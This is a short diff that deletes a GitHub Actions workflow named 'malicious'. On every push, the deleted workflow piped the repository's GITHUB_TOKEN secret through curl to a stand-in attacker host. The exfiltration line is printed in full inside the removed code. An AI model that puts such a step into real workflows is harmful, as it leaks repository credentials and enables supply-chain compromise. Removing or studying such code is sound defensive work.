@@ -1,7 +1,0 @@
-name: malicious
-on: [push]
-jobs:
-  exfil:
-    runs-on: ubuntu-latest
-    steps:
-      - run: echo "${{ secrets.GITHUB_TOKEN }}" | curl -d @- https://attacker.example
